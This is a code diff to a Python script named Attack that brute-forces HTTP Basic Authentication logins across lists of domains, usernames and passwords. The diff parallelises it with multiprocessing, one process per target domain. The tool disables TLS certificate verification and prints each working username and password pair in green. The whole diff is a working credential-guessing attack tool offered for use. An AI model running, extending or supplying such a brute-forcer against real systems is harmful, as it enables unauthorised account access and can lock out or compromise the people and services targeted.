@@ -8,6 +8,7 @@ import pdb
 import urllib3
 import ssl
 urllib3.disable_warnings()
+from multiprocessing import Process
 
 class File():
     def __init__(self, fileName, mode):
@@ -30,7 +31,6 @@ class Attack:
         self.parser.add_argument('-p', '--password', required=False, help="you can specify only one password")
         self.parser.add_argument('-D', '--domains', required=False, help="you can upload a txt file filled with domains")
         self.parser.add_argument('-d', '--domain', required=False, help="you can specify only one domain")
-        #self.parser.add_argument('-t', '--threads', required=False, type=int, choices=range(1, 10), default=1)
         self.parser.add_argument('-v', action='store_true', default=False, help="you can upload a txt file filled with usernames")
         self.args = self.parser.parse_args()
         self.status = False
@@ -65,34 +65,50 @@ class Attack:
         if (self.args.domain):
             self.domains.append(self.args.domain)
         
-        self.bruter(self.domains, self.users, self.passwords, self.args.v)
-                                
-    def bruter(self, url, users, passwords, verbose):
+        procs = []
+        proc = Process(target=self.bruter,args=('',))
+        procs.append(proc)
+        proc.start()
+
+        for url in self.domains:
+            proc = Process(target=self.bruter, args=(url,))
+            procs.append(proc)
+            proc.start()
+        
+        for proc in procs:
+            proc.join()
+
+
+    def bruter(self, url):
         try:
-            for url in self.domains:
-                #pdb.set_trace()
+            #pdb.set_trace()
+            if url:
                 try:
                     r = requests.get(url, verify=ssl.CERT_NONE)
                 except requests.exceptions.ConnectionError:
                     print("{} address could not be reached at the moment. If you are browsing with a domain list, please remove the unreachable domains from your list for the health of the program.".format(url))
-                    continue
+                    
                 self.status = False
                 if r.status_code == 401:
-                    for user in users:
-                        for passw in passwords:
+                    for user in self.users:
+                        for passw in self.passwords:
                             resp = requests.get(url, auth = HTTPBasicAuth(username=user, password=passw), verify=ssl.CERT_NONE)
                             if (resp.status_code == 200):
                                 print(Fore.GREEN + "[+]" + Style.RESET_ALL + " {} username: {} password: {}".format(url,user,passw))
                                 self.status = True
                                 break
-                            elif(verbose == True):
+                            elif(self.args.v == True):
                                 print(Fore.RED + "[-]" + Style.RESET_ALL + " {} username: {} password: {}".format(url,user,passw))
                         if self.status == True:
                             break
-                elif(verbose==True):
+                elif(self.args.v==True):
                     print(Fore.RED + "[-]" + Style.RESET_ALL + " There is no HTTPBasicAuth at the {} address".format(url))
         except requests.exceptions.SSLError:
-            print("ssl")
+            print("SSLError")
+        except UnboundLocalError:
+            print("UnboundLocalError")
+        except KeyboardInterrupt:
+            pass
 
 if __name__ == '__main__':
     try:
